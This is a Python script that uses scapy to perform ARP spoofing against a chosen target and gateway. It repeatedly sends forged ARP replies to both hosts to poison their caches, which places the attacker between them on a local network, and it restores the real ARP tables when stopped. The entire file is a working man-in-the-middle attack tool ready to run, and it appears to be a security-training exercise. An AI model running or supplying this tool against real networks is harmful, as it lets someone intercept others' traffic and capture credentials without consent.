import scapy.all as scapy
import optparse
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    
    if target_mac is None:
        return

    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.sendp(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)

    if dst_mac is None or src_mac is None:
        print("[!] Failed to get MAC address for restore.")
        return

    packet = scapy.Ether(dst=dst_mac) / scapy.ARP(
        op=2,
        pdst=dst_ip,
        hwdst=dst_mac,
        psrc=src_ip,
        hwsrc=src_mac
    )
    scapy.sendp(packet, verbose=False, count=4)

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target_ip", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    (options, arguments) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return options

try:
    sent_packet_count = 0
    options = get_arguments()
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        print("\r[+] Sent packets: " + str(sent_packet_count), end="")
        sent_packet_count += 2
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Quitting.")
    print("[+] Restoring ARP tables...")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)